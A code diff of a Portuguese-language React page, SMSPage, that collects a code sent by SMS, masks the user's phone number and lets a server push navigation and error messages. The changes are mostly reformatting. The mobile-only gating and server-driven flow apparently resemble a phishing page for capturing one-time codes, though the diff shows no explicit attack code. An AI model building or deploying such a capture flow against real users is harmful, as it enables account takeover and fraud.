@@ -21,7 +21,7 @@ const SMSPage = () => {
       navigate(resolveServerRoute(msg.url));
     },
     onMessage: (msg) => {
-      if (msg.acao === "erro_token") {
+      if (msg.acao === "erro_chave") {
         setErro(msg.motivo || "Código inválido. Tente novamente.");
         setEnviando(false);
       }
@@ -52,7 +52,7 @@ const SMSPage = () => {
     }
   };
 
-  const chaveCompleta = chave.every((d) => d !== "");
+  const chaveCompleta = chave.every(d => d !== "");
 
   const enviarChave = () => {
     if (!chaveCompleta) return;
@@ -62,7 +62,9 @@ const SMSPage = () => {
     navigate("/validando");
   };
 
-  const telefoneExibido = telefone ? `(${telefone.slice(0, 2)}) *****-${telefone.slice(-4)}` : "(--) *****-----";
+  const telefoneExibido = telefone
+    ? `(${telefone.slice(0, 2)}) *****-${telefone.slice(-4)}`
+    : "(--) *****-----";
 
   return (
     <>
@@ -70,24 +72,10 @@ const SMSPage = () => {
       <div className="hidden md:flex min-h-screen items-center justify-center bg-[hsl(220,60%,40%)] p-8">
         <div className="text-center text-white max-w-sm space-y-4">
           <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              className="w-8 h-8"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="currentColor"
-              strokeWidth="2"
-              strokeLinecap="round"
-              strokeLinejoin="round"
-            >
-              <rect width="14" height="20" x="5" y="2" rx="2" ry="2" />
-              <path d="M12 18h.01" />
-            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
           </div>
           <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
-          <p className="text-white/70 text-sm leading-relaxed">
-            Este portal está disponível apenas para dispositivos móveis.
-          </p>
+          <p className="text-white/70 text-sm leading-relaxed">Este portal está disponível apenas para dispositivos móveis.</p>
         </div>
       </div>
 
@@ -114,17 +102,8 @@ const SMSPage = () => {
           {/* Phone number display */}
           <div className="bg-white rounded-xl px-5 py-4 border border-[hsl(220,14%,89%)] mb-5 w-full flex items-center gap-3">
             <div className="w-10 h-10 rounded-full bg-[hsl(220,60%,40%)]/10 flex items-center justify-center shrink-0">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                className="w-5 h-5 text-[hsl(220,60%,40%)]"
-                viewBox="0 0 24 24"
-                fill="none"
-                stroke="currentColor"
-                strokeWidth="2"
-                strokeLinecap="round"
-                strokeLinejoin="round"
-              >
-                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
+              <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5 text-[hsl(220,60%,40%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
               </svg>
             </div>
             <div>
@@ -136,20 +115,11 @@ const SMSPage = () => {
           {/* Security key input */}
           <div className="w-full bg-white rounded-xl px-4 py-5 border border-[hsl(220,14%,89%)] mb-4">
             <div className="flex items-center gap-3 mb-4">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                className="w-10 h-10 shrink-0 text-[hsl(220,10%,60%)]"
-                viewBox="0 0 24 24"
-                fill="none"
-                stroke="currentColor"
-                strokeWidth="1.2"
-                strokeLinecap="round"
-                strokeLinejoin="round"
-              >
-                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
-                <path d="M8 10h.01" />
-                <path d="M12 10h.01" />
-                <path d="M16 10h.01" />
+              <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 shrink-0 text-[hsl(220,10%,60%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+                <path d="M8 10h.01"/>
+                <path d="M12 10h.01"/>
+                <path d="M16 10h.01"/>
               </svg>
               <h3 className="text-[hsl(220,20%,14%)] text-sm font-bold leading-tight">
                 Digite o código recebido por SMS
@@ -160,9 +130,7 @@ const SMSPage = () => {
               {chave.map((digit, i) => (
                 <input
                   key={i}
-                  ref={(el) => {
-                    inputRefs.current[i] = el;
-                  }}
+                  ref={el => { inputRefs.current[i] = el; }}
                   type="text"
                   inputMode="numeric"
                   maxLength={1}
@@ -175,8 +143,7 @@ const SMSPage = () => {
             </div>
 
             <p className="text-[hsl(220,10%,56%)] text-xs text-center mb-4">
-              Confira o número de série do seu dispositivo:{" "}
-              <span className="font-bold text-[hsl(220,20%,14%)]">{dispositivo || "—"}</span>
+              Confira o número de série do seu dispositivo: <span className="font-bold text-[hsl(220,20%,14%)]">{dispositivo || "—"}</span>
             </p>
 
             {erro && <p className="text-[hsl(0,84%,60%)] text-xs text-center mb-3">{erro}</p>}
